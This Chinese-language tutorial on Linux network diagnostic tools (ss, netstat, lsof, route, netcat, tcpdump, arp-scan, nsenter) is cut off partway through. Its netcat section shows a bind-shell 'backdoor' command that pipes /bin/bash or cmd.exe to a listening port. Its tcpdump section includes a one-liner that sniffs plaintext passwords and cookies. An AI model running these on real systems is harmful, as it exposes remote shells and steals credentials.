实用技巧-下载内容到标准输出stdout 如在下载一个tar包时，一般都是wget 后 在tar 解压到对应目录，可以使用 -O - 将其下载到标准输出，-q 静默方式，通过管道直接解压到对应的路径下。\nwget -q -O - \u0026quot;http://wordpress.org/latest.tar.gz\u0026quot; | tar -xzf - -C /var/www ss ss (socket statistics) 命令行工具，用于在Linux系统上显示与网络套接字相关的信息。\n各系统下的安装\nss Ubuntu/Debian: iproute2 ；apt install iproute2 CentOS/Fedora: iproute ；yum install -y iproute Apline：iproute ；apk add --no-cache iproute 查看所有连接 没有任何选项的ss命令只列出所有连接。\n查看Listening 与 Non-listening Ports ss -a 查看监听 套接字列表 这里列出所有监听套接字，不关其是服务监听还是客户端请求占用\nss -l 查看所有TCP连接 这里只所有的tcp连接， 包含客户端与服务端\nss -t 查看所有监听类型的tcp连接 ss -lt 查看所有udp连接 ss -ua 查看监听类型的UDP连接 ss -lu 显示socket的pid进程id ss -p 显示连接摘要信息 ss -s 显示ipv6或ipv4 连接 ss -4 ss -6 筛选连接 语法\nss [ OPTIONS ] [ STATE-FILTER ] [ ADDRESS-FILTER ] ss命令还提供了筛选方法，过滤套接字端口或地址。例如，要显示具有ssh服务的源端口与目标端口（即监听与客户端连接）。\nss -at '( dport = :22 or sport = :22 )' 也可以通过服务名称进行过滤\nss -at '( dport = :ssh or sport = :ssh )' 仅显示所有处于 established 状态的Ipv4 tcp套接字。\nss -t4 state established -n Recv-Q Send-Q Local Address:Port Peer Address:Port 0 0 172.16.0.2:22 61.50.248.5:22005 0 0 172.16.0.2:42930 169.254.0.55:5574 0 0 172.16.0.2:22 61.50.248.5:22008 0 0 172.16.0.2:22 61.50.248.5:22003 0 0 172.16.0.2:40652 94.130.12.30:443 0 36 172.16.0.2:22 61.50.248.5:22012 0 0 172.16.0.2:22 61.50.248.5:22004 列出状态为time wait的套接字\nss -t4 state time-wait -n 这里状态可以为下面的任意一种\nestablished syn-sent syn-recv fin-wait-1 fin-wait-2 time-wait closed close-wait last-ack closing all 上面所有状态 connected 除listen和closed之外的所有状态 synchronized 除syn-sent之外的所有连接状态 显示状态，这些被维护为mini sockets，即 time-wait 与 syn-recv big 与bucket选项相反 过滤地址\nss -nt dst 74.125.236.178 还可以过滤网段\nss -nt dst 74.125.236.178/16 ip和端口的组合\nss -nt dst 74.125.236.178:80 源地址为127.0.0.1，且源端口大于5000\nss -nt src 127.0.0.1 sport gt :5000 源端口为25的smtp套接字\nss -ntlp sport eq :smtp 端口号大于25\nss -nt sport gt :1024 远程端口小于100的套接字\nss -nt dport \\\u0026lt; :100 连接到远程80端口的\nss -nt state connected dport = :80 不解析主机名 可以通过 -n 选项阻止ss 将ip解析为主机名，来达到更快地获得输出，但这也无法进行到端口号的解析。\nss -at '( dport = :22 or sport = :22 )' State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:ssh *:* ESTAB 0 0 172.16.0.2:ssh 111.206.214.55:49374 ESTAB 0 0 172.16.0.2:ssh 61.50.248.5:optohost005 ESTAB 0 36 172.16.0.2:ssh 61.50.248.5:22008 ESTAB 0 0 172.16.0.2:ssh 61.50.248.5:optohost003 ESTAB 0 0 172.16.0.2:ssh 61.50.248.5:optohost004 LISTEN 0 128 [::]:ssh [::]:* ss -at '( dport = :22 or sport = :22 )' -n State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 128 *:22 *:* ESTAB 0 0 172.16.0.2:22 111.206.214.55:49374 ESTAB 0 0 172.16.0.2:22 61.50.248.5:22005 ESTAB 0 36 172.16.0.2:22 61.50.248.5:22008 ESTAB 0 0 172.16.0.2:22 61.50.248.5:22003 ESTAB 0 0 172.16.0.2:22 61.50.248.5:22004 LISTEN 0 128 [::]:22 [::]:* 仅显示监听套接字 ss -ltn 要列出所有侦听的udp连接，请将t替换为u\nss -lun 显示时间信息 可以使用 -o 选项，来获得每个连接的时间信息。通过timer得知\nss -tn -o State Recv-Q Send-Q Local Address:Port Peer Address:Port ESTAB 0 0 172.16.0.2:22 61.50.248.5:22005 timer:(keepalive,40min,0) ESTAB 0 0 172.16.0.2:42930 169.254.0.55:5574 ESTAB 0 0 172.16.0.2:22 61.50.248.5:22008 timer:(keepalive,64min,0) ESTAB 0 0 172.16.0.2:44900 169.254.0.55:80 timer:(keepalive,13sec,0) ESTAB 0 0 172.16.0.2:22 61.50.248.5:22003 timer:(keepalive,40min,0) ESTAB 0 36 172.16.0.2:22 61.50.248.5:22012 timer:(on,347ms,0) ESTAB 0 0 172.16.0.2:39316 94.130.12.30:443 timer:(keepalive,50sec,0) ESTAB 0 0 172.16.0.2:22 61.50.248.5:22004 timer:(keepalive,40min,0) netstat netstat (network statistics) 命令行工具，用于监视传入和传出的网络连接，以及查看路由表、接口统计等。netstat在所有类似Unix的操作系统上都可用，在Windows操作系统上也可用，是最基本的网络服务调试工具。\n不过，现在netstat 命令早已被弃用，取而代之的是 iproute 套件中的 ss。ss 比起 netstat，ss 能够显示有关网络连接的详细信息，并且速度更快。netstat 从 /proc 文件收集信息，当有大量连接要打印时，netstat 效率很低。而ss 是直接从内核空间获取信息。并且ss命令在使用起来与netstat 非常相似，用户几乎可以无缝切换。\n各系统下的安装\nss\nUbuntu/Debian: iproute2 ；apt install iproute2\nCentOS/Fedora: iproute ；yum install -y iproute\nApline：iproute ；apk add --no-cache iproute\nnetstat\nUbuntu/Debian: net-tools ；apt install net-tools\nCentOS/Fedora: net-tools ；yum install -y net-tools\nApline：net-tools ；apk add --no-cache net-tools\n列出所有tcp与udp的连接的所有端口 netstat -a 仅列出tcp (Transmission Control Protocol) 端口的连接 netstat -at 仅列出udp (User Datagram Protocol ) 端口的连接 netstat -au 列出所有活动监听端口连接 netstat -l 列出TCP监听端口 netstat -lt 列出udp监听端口 netstat -lu 列出unix socket 监听端口 netstat -lx 显示统计信息 netstat -s 显示tcp的统计信息 netstat -st 显示udp的统计信息 netstat -su 显示服务名与PID号 netstat -tp 显示混杂模式，类似watch 每5s 刷新 netstat -ac 5 | grep tcp 显示内核路由表，类似 route -n 命令；netstat -r 显示网络接口数据包事务，包括传输和接收MTU大小的数据包。 netstat -i 显示内核接口表，类似 ifconfig 命令。 netstat -ie 显示IPv4和IPv6的广播信息。netstat -g 混杂模式，间隔时间打印netstat命令的信息 netstat -c [second] -ltnp 显示原始网络信息统计 netstat --statistics --raw lsof lsof (LiSt Open Files)，主要用来找出哪个进程打开了哪些文件。众所周知，Linux是一个基于文件的操作系统（管道、套接字、目录、设备等）。使用lsof也可以排查一些网络问题。如未关闭的文件不能被移动或删除，网络端口使用的文件等，都可以通过lsof快速定位。\n各系统下的安装\nUbuntu/Debian: lsof ；apt install lsof CentOS/Fedora: lsof ；yum install -y lsof Apline：lsof ；apk add lsof --no-cache 列出所有打开的文件 不带任何参数的情况下运行lsof，可以列出所有打开的文件\nlsof 列出用户进程使用的文件 lsof 可以查看特定用户进程使用的哪些文件，使用-u\nlsof -u root 根据网络地址查找文件 lsof -i 4 按照程序名称列出所打卡的文件 这里不必使用完整的程序名，会列出所有以 name开头的进程应用使用的文件\nlsof -u nginx 列出进程使用的文件 使用 -p [pid] k可以显示进程打开的文件，可以通过 ^ 来排除特定的PID。\nlsof -p [pid] lsof -p [^pid] 找到使用文件的进程 使用 -t 餐食可以找到哪些进程使用了该文件\nlsof -t [file_name] 列出目录中所有打开的文件 +D 餐食可以对目录的所有打开实例（包括它包含的所有文件和目录）进行搜索。\nlsof +D [dir] 列出网络文件 -i 侦听特定端口号的进程或应用程序，如检查了哪个程序进程正在使用端口80。\nlsof -i:80 还可以根据端口范围进程查找\nlsof -i:1-1024 根据网络连接类型来查找文件 lsof还可以根据连接的类型列出文件。例如，TCP使用的文件\nlsof -i tcp 拿到进程的父进程ID lsof -R 可以拿到进程的父进程IP输出中列出父进程标识（PPID Parent Process IDentification）。\nlsof -p [] -R 查看用户的网络连接 结合使用 -i 和 -u 命令行选项，我们可以搜索Linux用户的所有网络连接。可以按照需要检查一个被黑客攻击的系统，如我们检查用户root的所有网络活动：\nlsof -a -i -u root 列出所有内存映射文件 lsof -d mem route 在Linux中，route命令用于处理IP/内核路由表。主要用于通过网络接口建立到主机/IP的静态路由。它用于显示或更新IP/内核路由表。\n各系统下的安装\nUbuntu/Debian: net-tools ；apt install net-tools CentOS/Fedora: net-tools ；yum install -y net-tools Apline：net-tools ；apk add net-tools --no-cache route命令不加任何参数，默认情况下将显示内核路由表条目的详细信息。当包在这个路由IP范围内发送时，通过ARP协议找到目的地的MAC地址，包将被发送到MAC地址。\n当在路由条目中找不到对应的路由信息，数据包将被转发到默认网关，该网关决定该数据包的进一步路由。\nroute命令不加参数，会在输出时显示为主机名，这时解析会影响性能。可以使用 -n 选项请求不显示主机名。\nroute -n 添加默认网关 可以使用 route add 命令添加一个默认网关。\nroute add default gw 10.0.0.1 添加一条路由 这里添加一条，将通过10.0.0.0/24的流量由eth0设备通过 添加一条路由，如下所示。\nroute add -net 10.0.0.0 netmask 255.255.255.0 dev eth0 -net 目标网络\ndev 将规则和设备关联在一起\n添加一个目标主机\nroute add -host 12.123.0.10 gw 192.168.1.1 enp0s3 列出内核路由表信息 内核维护了路由缓存以更快地路由数据包。可以使用 -C 来打印内核的路由缓存信息。\nroute -Cn Kernel IP routing cache Source Destination Gateway Flags Metric Ref Use Iface 10.0.0.4 10.0.0.1 10.0.0.1 0 1 0 eth0 10.0.0.1 10.0.0.4 10.0.0.4 il 0 0 44 lo 10.0.0.1 10.0.0.255 10.0.0.255 ibl 0 0 7 lo 拒绝路由到特定的主机 有些场景下，可能需要拒绝数据包路由到特定的主机/网络。\nroute add -host 192.168.1.51 reject 可以看到路由已经不会路由该流量了\nping 10.0.0.2 connect: No route to host 如果需要拒绝整个网络可以这样\nroute add -net 192.168.1.0 netmask 255.255.255.0 reject 删除一条路由 # 删除默认路由 route del default # 删除刚才添加的拒绝路由 route del -host 10.0.0.2 reject ncat \u0026amp; netcat(nc) \u0026amp; nmap netcat（简称nc）是一款功能强大的网络命令行工具，用于在Linux中执行与TCP、UDP或UNIX域套接字相关的任何操作。netcat可以用于端口扫描、端口重定向，作为端口监听器（用于传入连接）；它还可以用来打开远程连接和其他许多事情。此外，还可以将其用作访问目标服务器的后门。netcat还因此被称为TCP/IP的“瑞士军刀”。\n各系统下的安装\nUbuntu/Debian: netcat ；apt install netcat CentOS/Fedora: nc ；yum install -y nc Apline：netcat-openbsd ；apk add --no-cache netcat-openbsd 端口扫描 netcat可以用于端口扫描：了解哪些端口是开放的，并且在目标机器上运行服务。它可以扫描单一或多个开防的端口。如示例，-z 选项将nc设置为只扫描监听守护进程，而不实际向它们发送任何数据。-v 选项启用详细模式，-w 为无法建立连接时超时时间。\nnc -v -w 10 -z 195.133.11.43 22 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 195.133.11.43:22. Ncat: 0 bytes sent, 0 bytes received in 0.25 seconds. 也可以扫描一个范围\nnc -v -n -z -w 1 127.0.0.1 1-1000 在服务器间传送文件 netcat可以在两台服务器之间传输文件，这两个系统都必须安装nc。例如，要将ISO映像文件从一台计算机复制到另一台计算机并监视传输进度（使用pv），请在发送方/接收端上运行以下命令。\n将以netcat 的监听模式 -l。\ntar -zcf - debian-10.0.0-amd64-xfce-CD-1.iso | pv | nc -l -p 3000 -q 5 在接受端运行命令\nnc 192.168.1.4 3000 | pv | tar -zxf - 使用netcat实现一个命令行聊天服务器 可以使 netcat 创建一个简单的命令行消息服务器，前提条件是nc必须安装在两个系统上。在服务端，运行命令来创建监听端口5555的聊天服务器。\nnc -l -vv -p 5000 在客户端上，运行命令连接到服务端进行聊天会话。\nnc {ip} 5000 使用nc创建一个web服务器 使用nc -l 选项可以创建一个基础的不安全的web服务器，需要一个静态html文件。然后可以通过 while 保持netcat命令不退出。正常情况下，netcat在连接断开时退出。\nwhile : ; do ( echo -ne \u0026quot;HTTP/1.1 200 OK\\r\\n\u0026quot; ; cat 1.html; ) | nc -l -p 8080 ; done $ while : ; do ( echo -ne \u0026quot;HTTP/1.1 200 OK\\r\\n\u0026quot; ; cat 1.html; ) | nc -l -p 8080 ; done GET / HTTP/1.1 Host: ip:8080 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6 网络故障排查 netcat 主要常用的一个方面时排查网络连接故障，可以使用 netcat 来验证服务器正在发送哪些数据以响应客户端发出的命令。\n使用命令的可以输出包括web服务器发送的标头，这些标头可用于故障排除。也可以使用 curl 等命令进行同样的操作。\nprintf \u0026quot;GET / HTTP/1.0\\r\\n\\r\\n\u0026quot; | nc baidu.com 80 HTTP/1.1 200 OK Date: Mon, 28 Jun 2021 12:16:55 GMT Server: Apache Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT ETag: \u0026quot;51-47cf7e6ee8400\u0026quot; Accept-Ranges: bytes Content-Length: 81 Cache-Control: max-age=86400 Expires: Tue, 29 Jun 2021 12:16:55 GMT Connection: Close Content-Type: text/html \u0026lt;html\u0026gt; \u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot; content=\u0026quot;0;url=http://www.baidu.com/\u0026quot;\u0026gt; \u0026lt;/html\u0026gt; 查找端口上运行的服务 使用 netcat 可以获取服务监听端口的信息，单一般情况下，仅常见公共服务会这样，一些服务并不会相应对应的应用名称。。-n 标志表示禁用DNS或服务查找。\nnc -v -n 195.133.11.43 22 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 195.133.11.43:22. SSH-2.0-OpenSSH_7.4 网络后门 一般情况下，黑客将 netcat 当作网络后门来运行，通过反弹式shell以获取远程命令。要充当后门。-e 在目标系统上运行的命令。\n如监听一个端口，并将所有传入的输入传递给bash命令，结果将传送于客户端。\n# linux nc -l -p -v 3001 -e /bin/bash # windows nc -l -p 3001 -e cmd.exe 检查一个udp端口 -z：无法进行I/O ，仅报告连接状态\n-u：使用udp协议\nnc -vz -u tcpdump [1] tcpdump网络嗅探器，将强大和简单结合到一个单一的命令行界面中，能够将网络中的报文抓取，输出到屏幕或者记录到文件中。\n各系统下的安装\nUbuntu/Debian: tcpdump ；apt-get install -y tcpdump CentOS/Fedora: tcpdump ；yum install -y tcpdump Apline：tcpdump ；apk add tcpdump --no-cache 查看指定接口上的所有通讯\n语法\n参数 说明 -i [interface] 接口名 -p --no-promiscuous-mode 抓包内容为非混杂模式下的包 -w [flle] 保存原始的包到文件中 -n 不转换IP为DNS名称 -N 将端口解析为数字格式而不是服务名 -A 以 ASCII 格式打印内容（不包含标头） -XX 打印数据为==数据包的标头==与以十六进制和 ASCII 格式打印数据包的数据。 -v/-vv/-vvv 详细信息；-v, -vv 将打印更多信息 -r 读取文件而不是实时抓包 关键字\n参数 关键字 type host, net, port, portrange direction src, dst, src or dst , src and ds protocol ether, ip, arp, tcp, udp, wlan 捕获所有网络接口 tcpdump -D 按IP查找流量 最常见的查询之一 host，可以看到来往于 1.1.1.1 的流量。\ntcpdump host 1.1.1.1 按源/目的 地址过滤 如果只想查看来自/向某方向流量，可以使用 src 和 dst。\ntcpdump src|dst 1.1.1.1 通过网络查找数据包 使用 net 选项，来要查找出/入某个网络或子网的数据包。\ntcpdump net 1.2.3.0/24 使用十六进制输出数据包内容 hex 可以以16进制输出包的内容\ntcpdump -c 1 -X icmp 查看特定端口的流量 使用 port 选项来查找特定的端口流量。\ntcpdump port 3389 tcpdump src port 1025 查找端口范围的流量 tcpdump portrange 21-23 过滤包的大小 如果需要查找特定大小的数据包，可以使用以下选项。你可以使用 less，greater。\ntcpdump less 32 tcpdump greater 64 tcpdump \u0026lt;= 128 捕获流量输出为文件 -w 可以将数据包捕获保存到一个文件中以便将来进行分析。这些文件称为PCAP（PEE-cap）文件，它们可以由不同的工具处理，包括 Wireshark 。\ntcpdump port 80 -w capture_file 组合条件 tcpdump也可以结合逻辑运算符进行组合条件查询\nAND and or \u0026amp;\u0026amp;\nOR or or ||\nEXCEPT not or !\ntcpdump -i eth0 -nn host 220.181.57.216 and 10.0.0.1 # 主机之间的通讯 tcpdump -i eth0 -nn host 220.181.57.216 or 10.0.0.1 # 获取10.0.0.1与 10.0.0.9或 10.0.0.1 与10.0.0.3之间的通讯 tcpdump -i eth0 -nn host 10.0.0.1 and \\(10.0.0.9 or 10.0.0.3\\) 原始输出 并显示人类可读的内容进行输出包（不包含内容）。\ntcpdump -ttnnvvS -i eth0 IP到端口 让我们查找从某个IP到端口任何主机的某个端口所有流量。\ntcpdump -nnvvS src 10.5.2.3 and dst port 3389 去除特定流量 可以将指定的流量排除，如这显示所有到192.168.0.2的 非ICMP的流量。\ntcpdump dst 192.168.0.2 and src net and not icmp 来自非指定端口的流量，如，显示来自不是SSH流量的主机的所有流量。\ntcpdump -vv src mars and not dst port 22 选项分组 在构建复杂查询时，必须使用单引号 '。单引号用于忽略特殊符号 () ，以便于使用其他表达式（如host, port, net等）进行分组。\ntcpdump 'src 10.0.2.4 and (dst port 3389 or 22)' 过滤TCP标记位 TCP RST\nThe filters below find these various packets because tcp[13] looks at offset 13 in the TCP header, the number represents the location within the byte, and the !=0 means that the flag in question is set to 1, i.e. it’s on.\ntcpdump 'tcp[13] \u0026amp; 4!=0' tcpdump 'tcp[tcpflags] == tcp-rst' TCP SYN\ntcpdump 'tcp[13] \u0026amp; 2!=0' tcpdump 'tcp[tcpflags] == tcp-syn' 同时忽略SYN和ACK标志的数据包\ntcpdump 'tcp[13]=18' TCP URG\ntcpdump 'tcp[13] \u0026amp; 32!=0' tcpdump 'tcp[tcpflags] == tcp-urg' TCP ACK\ntcpdump 'tcp[13] \u0026amp; 16!=0' tcpdump 'tcp[tcpflags] == tcp-ack' TCP PSH\ntcpdump 'tcp[13] \u0026amp; 8!=0' tcpdump 'tcp[tcpflags] == tcp-push' TCP FIN\ntcpdump 'tcp[13] \u0026amp; 1!=0' tcpdump 'tcp[tcpflags] == tcp-fin' 查找http包 查找 user-agent 信息\ntcpdump -vvAls0 | grep 'User-Agent:' 查找只是 GET 请求的流量\ntcpdump -vvAls0 | grep 'GET' 查找http客户端IP\ntcpdump -vvAls0 | grep 'Host:' 查询客户端cookie\ntcpdump -vvAls0 | grep 'Set-Cookie|Host:|Cookie:' 查找DNS流量 tcpdump -vvAs0 port 53 查找对应流量的明文密码 tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep -i -B5 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user ' arp ARP “地址解析协议” (Address Resolution Protoco)，是一种将IP地址映射到局域网上物理MAC地址的协议。\n为什么我们需要MAC地址？\n任何本地通信都将使用MAC地址，而不是IP地址。当一台计算机想在不同的网络上与另一台计算机通信时，将使用IP地址。IP地址就像你的邮寄收货地址，而MAC地址就像你的名字。在TCP/IP网络上，每台计算机都被分配IP地址，一些本地服务器的IP地址也被分配给网络客户主机。因此其在第2层（数据链路层）和第3层（网络层）之间工作。\n在一个本地网络中，客户主机尝试在连接另外一个主机时（这里为同一网络，即同一广播域中），首先客户端会检查ARP缓存表（缓存IP于MAC的关系）。而 arp 命令可以管理系统的arp缓存表。它允许完全转储ARP缓存。\n各系统下的安装\nUbuntu/Debian: net-tools ；apt install net-tools CentOS/Fedora: net-tools ；yum install -y net-tools Apline：net-tools ；apk add --no-cache net-tools 查看arp条目 arp 命令在没有任何选项的情况下将显示arp缓存表的内容。\narp Address HWtype HWaddress Flags Mask Iface correspond.fsddsfk.cn ether c4:71:fe:f1:9f:3f C eth0 gateway ether 00:1f:ce:72:bd:8c C eth0 显示一个特定的arp条目 当arp缓存表很大不利于查看，并且仅需要拿到特定IP的条目的话，可以在 -a 后加具体IP地址来获取一个特定的条目。\narp -a 46.17.40.155 correspond.faaaaa.cn (10.17.40.1) at c4:71:fe:f1:9f:3f [ether] on eth0 显示指定接口的arp缓存表 如果仅希望显示一个接口的arp条目，可以通过 arp 命令 -i选项后跟接口名称。\narp -i bond0 Address HWtype HWaddress Flags Mask Iface usartdb02.exmpl.c ether 17:a9:9b:f5:1a:7e C bond0 usartdb02.exmpl.c ether f8:db:77:f2:5a:a2 C bond0 删除一个arp条目 从arp缓存表中删除一个ip条目，可以使用 arp 命令-d选项，后跟IP地址。当一旦执行arp命令，ARP缓存表就会被刷新。\narp -d 192.168.188.2 向arp缓存添加一个条目 永久添加一个条目到arp缓存中，使用 -s 选项，需要指定IP地址和MAC地址外，还需要指定将条目添加到哪个接口。如：\narp -s 192.168.188.133 -i eth0 00:0c:29:f6:1d:81 清空arp缓存表 某些场景下，需要清空arp缓存，而 arp 命令并没有清空缓存表的操作，这时可以使用 ip neigh 而且ip-route2 最小化安装；基础容器等场景下也会存在。\nip neigh flush dev eth0s 显示格式 使用 -e 选项以linux标准格式输出arp缓存表\n其输出格式中，ARP缓存表中的每个完整条目都将被标记为 C Complete entry。M （Permanent entry）表示永久条目；P （Published entry.）表示已发布条目标记。\narp -ae Address HWtype HWaddress Flags Mask Iface correspond.fsddsfk.cn ether c4:71:fe:fe:9f:2f C eth0 arp -aen Address HWtype HWaddress Flags Mask Iface 36.17.40.111 ether c4:71:fe:fe:9f:2f C eth0 arp-scan 网络扫描是渗透测试的步骤之一。有不同的和流行的工具来扫描网络线masscan，nmap等。Arp扫描。\narp-scan 是专门设计用来扫描二层（网络层）的mac, arp数据包的工具（也可称为ARP Sweep 或 MAC Scanner ）；是一个非常快速的ARP包扫描程序，它可以显示子网中所有活动的IPv4设备。由于ARP是不可路由的，这种类型的扫描仪只能在本地LAN（本地子网或网段）上工作。\narp-scan 显示所有活动设备，即使它们有防火墙。设备不能像躲避Ping一样躲避ARP包。\n各系统下的安装\nUbuntu/Debian: arp-scan ；apt install arp-scan CentOS/Fedora: arp-scan (epel) ；yum install -y arp-scan Apline：arp-scan ；apk add --no-cache arp-scan 扫描本地网络 arp-scan 的最基本使用方法是扫描本地网络，使用-l 或 --localnet 可以扫描整个本地网络，但需要root权限\narp-scan --localnet Interface: eth0, type: EN10MB, MAC: da:78:c8:7a:fb:26, IPv4: 195.133.11.43 Starting arp-scan 1.9.7 with 512 hosts (https://github.com/royhills/arp-scan) 195.133.10.1 00:1f:ce:72:bd:8c QTECH LLC 195.133.10.2 56:85:8e:2b:cf:11 (Unknown: locally administered) 195.133.10.5 de:58:c6:5b:b5:c2 (Unknown: locally administered) 195.133.10.7 de:ed:ae:4b:7a:c8 (Unknown: locally administered) 195.133.10.6 d2:a6:f4:4c:f0:4b (Unknown: locally administered) 设置源mac 在apr扫描的过程中，会使用现有的mac地址进行请求，这样会留下网络痕迹，arp-scan 提供了修改源mac的功能。使用 --destaddr 或 -T 。\n###指定特殊vlan\n在网络设备中，一个接口可以实现多个网络，这使用了虚拟局域网VLAN（Virtual Local Area Network）的多路复用协议。如果接口是 trunk ，意味接口承载多个VLAN，我们可能需要指定VLAN id，可以使用 --vlan 或 -Q指定vlan id\narp-scan -i eth0 -Q 10 发现网络冲突 arp-scan 也可用于发现IP冲突与识别设备等操，只需一个命令 arp scan -l。可以通过 -i 指定端口。\n这里 192.168.1.39 冲突，因为出现了两次并且指定了不同的mac地址。\narp-scan –I eth0 -l 192.168.1.10 00:1b:a9:63:a2:4c BROTHER INDUSTRIES, LTD. 192.168.1.30 00:1e:8f:58:ec:49 CANON INC. 192.168.1.33 00:25:4b:1b:10:20 Apple, Inc 192.168.1.37 10:9a:dd:55:d7:95 Apple Inc 192.168.1.38 20:c9:d0:27:8d:56 (Unknown) 192.168.1.39 d4:85:64:4d:35:be Hewlett Packard 192.168.1.39 00:0b:46:e4:8e:6d Cisco (DUP: 2) 192.168.1.40 90:2b:34:18:59:c0 (Unknown) ethtool ethtool 命令用于 显示, 配置以太网设备。可以在Linux中使用此工具更改网卡速度, 自动协商, LAN唤醒设置, 双工模式。\n各系统下的安装\nUbuntu/Debian: ethtool ；apt install ethtool CentOS/Fedora: ethtool (epel) ；yum install -y ethtool Apline：ethtool ；apk add --no-cache ethtool 列出以太网设备属性 ethtool eth0 Settings for eth0: Supported ports: [ ] Supported link modes: Not reported Supported pause frame use: No Supports auto-negotiation: No Supported FEC modes: Not reported Advertised link modes: Not reported Advertised pause frame use: No Advertised auto-negotiation: No Advertised FEC modes: Not reported Speed: Unknown! Duplex: Unknown! (255) Port: Other PHYAD: 0 Transceiver: internal Auto-negotiation: off Link detected: yes 查看网络接口于容器内接口的对应关系 可以通过ethtool查看容器的网卡对，通过-S 加接口设备名，-S 为统计信息\n在宿主机上 使用命令查看，其中peer_ifindex: 767 对应容器内 ip link 的编号\nethtool -S veth45562ed 容器内\n$ ip link 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 767: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP mode DEFAULT group default link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff nsenter nsenter是一款可以进入进程的名称空间中。例如，如果一个容器以非 root 用户身份运行，而使用 docker exec 进入其中后，但该容器没有安装 sudo 或未 netstat ，并且您想查看其当前的网络属性，如开放端口，这种场景下将如何做到这一点？nsenter 就是用来解决这个问题的。\nnsenter (namespace enter) 可以在容器的宿主机上使用 nsenter 命令进入容器的命名空间，以容器视角使用宿主机上的相应网络命令进行操作。==当然需要拥有 root 权限==\n各系统下的安装 [4]\nUbuntu/Debian: util-linux ；apt-get install -y util-linux CentOS/Fedora: util-linux ；yum install -y util-linux Apline：util-linux ；apk add util-linux --no-cache nsenter 的使用语法为，nsenter -t pid -n \u0026lt;commond\u0026gt;，-t 接 进程ID号，-n 表示进入名称空间内，\u0026lt;commond\u0026gt; 为执行的命令。更多的内容可以参考 [3]\n实例：如我们有一个Pod进程ID为30858，进入该Pod名称空间内执行 ifconfig ，如下列所示\n$ ps -ef|grep tail root 17636 62887 0 20:19 pts/2 00:00:00 grep --color=auto tail root 30858 30838 0 15:55 ? 00:00:01 tail -f $ nsenter -t 30858 -n ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1480 inet 192.168.1.213 netmask 255.255.255.0 broadcast 192.168.1.255 ether 5e:d5:98:af:dc:6b txqueuelen 0 (Ethernet) RX packets 92 bytes 9100 (8.8 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 92 bytes 8422 (8.2 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 loop txqueuelen 1000 (Local Loopback) RX packets 5 bytes 448 (448.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 5 bytes 448 (448.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 net1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 10.1.0.201 netmask 255.255.255.0 broadcast 10.1.0.255 ether b2:79:f9:dd:2a:10 txqueuelen 0 (Ethernet) RX packets 228 bytes 21272 (20.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 216 bytes 20272 (19.7 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 如何定位Pod名称空间 首先需要确定Pod所在的节点名称\n$ kubectl get pods -owide |awk '{print $1,$7}' NAME NODE netbox-85865d5556-hfg6v master-machine netbox-85865d5556-vlgr4 node01 如果Pod不在当前节点还需要用IP登录则还需要查看IP（可选）\n$ kubectl get pods -owide |awk '{print $1,$6,$7}' NAME IP NODE netbox-85865d5556-hfg6v 192.168.1.213 master-machine netbox-85865d5556-vlgr4 192.168.0.4 node01 接下来，登录节点，获取容器lD，如下列所示，每个pod默认有一个 pause 容器，其他为用户yaml文件中定义的容器，理论上所有容器共享相同的网络命名空间，排查时可任选一个容器。\n$ docker ps |grep netbox-85865d5556-hfg6v 6f8c58377aae f78dd05f11ff \u0026quot;tail -f\u0026quot; 45 hours ago Up 45 hours k8s_netbox_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0 b9c732ee457e registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 \u0026quot;/pause\u0026quot; 45 hours ago Up 45 hours k8s_POD_netbox-85865d5556-hfg6v_default_4a8e2da8-05d1-4c81-97a7-3d76343a323a_0 接下来获得获取容器在节点系统中对应的进程号，如下所示\n$ docker inspect --format \u0026quot;{{ .State.Pid }}\u0026quot; 6f8c58377aae 30858 最后就可以通过 nsenter 进入容器网络空间执行命令了\npaping paping 命令可对目标地址指定端口以TCP协议进行连续ping，通过这种特性可以弥补 ping ICMP协议，以及 nmap , telnet 只能进行一次操作的的不足；通常情况下会用于测试端口连通性和丢包率\npaping download：paping\npaping 还需要安装以下依赖，这取决于你安装的 paping 版本\nRedHat/CentOS：yum install -y libstdc++.i686 glibc.i686 Ubuntu/Debian：最小化安装无需依赖 $ paping -h paping v1.5.5 - Copyright (c) 2011 Mike Lovell Syntax: paping [options] destination Options: -?, --help display usage -p, --port N set TCP port N (required) --nocolor Disable color output -t, --timeout timeout in milliseconds (default 1000) -c, --count N set number of checks to N mtr mtr 是一个跨平台的网络诊断工具，将 